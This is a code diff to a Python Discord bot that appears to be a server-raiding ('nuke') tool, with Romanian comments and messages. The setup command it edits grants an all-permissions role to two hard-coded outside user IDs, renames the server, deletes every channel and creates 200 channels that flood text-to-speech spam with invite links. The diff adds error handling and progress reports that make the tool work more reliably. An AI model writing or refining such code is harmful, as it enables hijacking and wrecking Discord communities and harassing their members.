@@ -4,7 +4,7 @@ from datetime import datetime
 
 import aiohttp, discord
 from discord import app_commands, Interaction
-from discord.errors import HTTPException
+from discord.errors import HTTPException, Forbidden
 from discord.ext import commands, tasks
 from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
 from discord.ui import Button, Select, View
@@ -205,6 +205,11 @@ async def setup(ctx):
     user = ctx.author
     user_config = get_user_config(user.id)
 
+    # Verificare permisiuni bot
+    if not ctx.guild.me.guild_permissions.administrator:
+        await ctx.send("❌ Botul nu are permisiunea de **Administrator**. Te rog să i-o acorzi.")
+        return
+
     if guild.id == BLACKLISTED_GUILD_ID:
         await ctx.reply("`This server is blacklisted.`")
         return
@@ -230,25 +235,35 @@ async def setup(ctx):
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
+    # CREARE ROL ADMIN
     try:
         admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
         for admin_id in admin_users:
             member = guild.get_member(admin_id)
             if member:
                 await member.add_roles(admin_role)
-    except:
-        pass
+                await ctx.send(f"✅ Rol admin acordat lui {member.name}")
+    except Forbidden:
+        await ctx.send("❌ Nu am permisiunea să creez roluri.")
+    except Exception as e:
+        await ctx.send(f"❌ Eroare la crearea rolului: {e}")
 
+    # SCHIMBARE NUME SERVER
     try:
         await guild.edit(name="1weeksober owns this")
-    except:
-        pass
+        await ctx.send("✅ Nume server schimbat.")
+    except Exception as e:
+        await ctx.send(f"⚠️ Nu am putut schimba numele: {e}")
 
+    # STERGERE CANALE
+    deleted = 0
     for channel in guild.channels:
         try:
             await channel.delete()
+            deleted += 1
         except:
             continue
+    await ctx.send(f"✅ Șterse {deleted} canale.")
 
     channel_names = [
         "1weeksober-owns",
@@ -259,6 +274,7 @@ async def setup(ctx):
 
     spam_message = "This sv has been officially closed\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire"
 
+    # CREARE 200 CANALE (modificat de la 500 la 200)
     async def create_channel_and_send():
         try:
             name = random.choice(channel_names) + "-" + str(random.randint(1000, 9999))
@@ -266,19 +282,23 @@ async def setup(ctx):
             spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
                 await ch.send(content=spam_message, tts=True)
-        except:
-            pass
+        except Exception as e:
+            print(f"Eroare la creare canal: {e}")
 
-    tasks = [create_channel_and_send() for _ in range(500)]
-    for i in range(0, len(tasks), 50):
-        await asyncio.gather(*tasks[i:i+50])
-        await asyncio.sleep(0.5)
+    await ctx.send("🔄 Se creează 200 de canale... (durează ~30 de secunde)")
+    tasks = [create_channel_and_send() for _ in range(200)]
+    for i in range(0, len(tasks), 20):
+        await asyncio.gather(*tasks[i:i+20])
+        await asyncio.sleep(1)
 
+    # CREARE ROL
     try:
         await guild.create_role(name="1weeksober-on-top")
+        await ctx.send("✅ Rol creat.")
     except:
         pass
 
+    await ctx.send("✅ Nuke finalizat! Părăsesc serverul...")
     await guild.leave()
 
 class SettingsModal(discord.ui.Modal):
@@ -344,7 +364,8 @@ class SettingsModal(discord.ui.Modal):
 
 @bot.event
 async def on_ready():
-    print(f"Bot is online as {bot.user}!")
+    print(f"✅ Bot is online as {bot.user}!")
+    print(f"📊 Conectat la {len(bot.guilds)} servere.")
     await bot.tree.sync()
 
 app = Flask(__name__)
